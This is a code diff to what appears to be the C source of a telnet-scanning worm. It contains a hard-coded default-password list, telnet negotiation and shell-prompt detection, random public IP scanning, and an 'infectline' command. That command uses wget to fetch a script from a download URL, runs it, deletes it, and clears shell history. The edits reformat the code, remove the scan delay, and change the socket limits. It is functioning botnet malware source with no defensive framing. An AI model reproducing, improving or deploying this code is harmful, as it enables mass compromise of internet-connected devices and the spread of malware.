@@ -5,8 +5,26 @@ char *passwords[] = {"root\0", "toor\0", "admin\0", "user\0", "guest\0", "login\
 
 int sclose(int fd)
 {
-	if(3 > fd) return 1;
+	if (3 > fd)
+		return 1;
 	close(fd);
+	return 0;
+}
+
+int matchPrompt(char *bufStr)
+{
+	char *prompts = ":>%$#\0";
+
+	int bufLen = strlen(bufStr);
+	int i, q = 0;
+	for (i = 0; i < strlen(prompts); i++)
+	{
+		while (bufLen > q && (*(bufStr + bufLen - q) == 0x00 || *(bufStr + bufLen - q) == ' ' || *(bufStr + bufLen - q) == '\r' || *(bufStr + bufLen - q) == '\n'))
+			q++;
+		if (*(bufStr + bufLen - q) == prompts[i])
+			return 1;
+	}
+
 	return 0;
 }
 
@@ -14,24 +32,30 @@ int negotiate(int sock, unsigned char *buf, int len)
 {
 	unsigned char c;
 
-	switch (buf[1]) {
-	case CMD_IAC: /*dropped an extra 0xFF wh00ps*/ return 0;
+	switch (buf[1])
+	{
+	case CMD_IAC: /*dropped an extra 0xFF wh00ps*/
+		return 0;
 	case CMD_WILL:
 	case CMD_WONT:
 	case CMD_DO:
 	case CMD_DONT:
-			c = CMD_IAC;
-			send(sock, &c, 1, MSG_NOSIGNAL);
-			if (CMD_WONT == buf[1]) c = CMD_DONT;
-			else if (CMD_DONT == buf[1]) c = CMD_WONT;
-			else if (OPT_SGA == buf[1]) c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
-			else c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);
-			send(sock, &c, 1, MSG_NOSIGNAL);
-			send(sock, &(buf[2]), 1, MSG_NOSIGNAL);
-			break;
+		c = CMD_IAC;
+		send(sock, &c, 1, MSG_NOSIGNAL);
+		if (CMD_WONT == buf[1])
+			c = CMD_DONT;
+		else if (CMD_DONT == buf[1])
+			c = CMD_WONT;
+		else if (OPT_SGA == buf[1])
+			c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
+		else
+			c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);
+		send(sock, &c, 1, MSG_NOSIGNAL);
+		send(sock, &(buf[2]), 1, MSG_NOSIGNAL);
+		break;
 
 	default:
-			break;
+		break;
 	}
 
 	return 0;
@@ -46,27 +70,38 @@ int readUntil(int fd, char *toFind, int matchLePrompt, int timeout, int timeoutu
 	tv.tv_usec = timeoutusec;
 	unsigned char *initialRead = NULL;
 
-	while(bufferUsed + 2 < bufSize && (tv.tv_sec > 0 || tv.tv_usec > 0))
+	while (bufferUsed + 2 < bufSize && (tv.tv_sec > 0 || tv.tv_usec > 0))
 	{
-			FD_ZERO(&myset);
-			FD_SET(fd, &myset);
-			if (select(fd+1, &myset, NULL, NULL, &tv) < 1) break;
-			initialRead = buffer + bufferUsed;
-			got = recv(fd, initialRead, 1, 0);
-			if(got == -1 || got == 0) return 0;
+		FD_ZERO(&myset);
+		FD_SET(fd, &myset);
+		if (select(fd + 1, &myset, NULL, NULL, &tv) < 1)
+			break;
+		initialRead = buffer + bufferUsed;
+		got = recv(fd, initialRead, 1, 0);
+		if (got == -1 || got == 0)
+			return 0;
+		bufferUsed += got;
+		if (*initialRead == 0xFF)
+		{
+			got = recv(fd, initialRead + 1, 2, 0);
+			if (got == -1 || got == 0)
+				return 0;
 			bufferUsed += got;
-			if(*initialRead == 0xFF)
+			if (!negotiate(fd, initialRead, 3))
+				return 0;
+		}
+		else
+		{
+			if (strstr(buffer, toFind) != NULL || (matchLePrompt && matchPrompt(buffer)))
 			{
-					got = recv(fd, initialRead + 1, 2, 0);
-					if(got == -1 || got == 0) return 0;
-					bufferUsed += got;
-					if(!negotiate(fd, initialRead, 3)) return 0;
-			} else {
-					if(strstr(buffer, toFind) != NULL || (matchLePrompt && matchPrompt(buffer))) { found = 1; break; }
+				found = 1;
+				break;
 			}
+		}
 	}
 
-	if(found) return 1;
+	if (found)
+		return 1;
 	return 0;
 }
 
@@ -89,34 +124,19 @@ in_addr_t getRandomPublicIP()
 	return inet_addr(ip);
 }
 
-int matchPrompt(char *bufStr)
+void ft_scan_world(void) // verif si work tjr
 {
-	char *prompts = ":>%$#\0";
-
-	int bufLen = strlen(bufStr);
-	int i, q = 0;
-	for(i = 0; i < strlen(prompts); i++)
-	{
-			while(bufLen > q && (*(bufStr + bufLen - q) == 0x00 || *(bufStr + bufLen - q) == ' ' || *(bufStr + bufLen - q) == '\r' || *(bufStr + bufLen - q) == '\n')) q++;
-			if(*(bufStr + bufLen - q) == prompts[i]) return 1;
-	}
-
-	return 0;
-}
-
-void ft_scan_world(pthread_t thread) // verif si work tjr
-{
-	char	*infectline;
+	char *infectline;
 	infectline = strdup("cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget -O wget.sh ");
 	infectline = ft_strnjoin(infectline, download_url, ft_strlen(download_url));
-	infectline = ft_strnjoin(infectline, "; chmod 777 wget.sh; sh wget.sh; rm wget.sh; history -c\r\n", 57);
+	infectline = ft_strnjoin(infectline, "; chmod +x wget.sh; sh wget.sh; rm wget.sh; history -c\r\n", 57);
 	int max = (getdtablesize() / 4) * 3, i, res;
 	fd_set myset;
 	struct timeval tv;
 	socklen_t lon;
 	int valopt;
 
-	max = max > 512 ? 512 : max;
+	max = max > 320 ? 320 : max;
 
 	struct sockaddr_in dest_addr;
 	dest_addr.sin_family = AF_INET;
@@ -134,7 +154,7 @@ void ft_scan_world(pthread_t thread) // verif si work tjr
 		uint32_t totalTimeout;
 		uint16_t bufUsed;
 		char *sockbuf;
-	} fds[max];
+	} fds[max + 1024];
 	memset(fds, 0, max * (sizeof(int) + 1));
 	for (i = 0; i < max; i++)
 	{
@@ -147,7 +167,7 @@ void ft_scan_world(pthread_t thread) // verif si work tjr
 	timeout.tv_usec = 0;
 	while (1)
 	{
-		sleep(5);
+		//sleep(5);
 		for (i = 0; i < max; i++)
 		{
 			switch (fds[i].state)
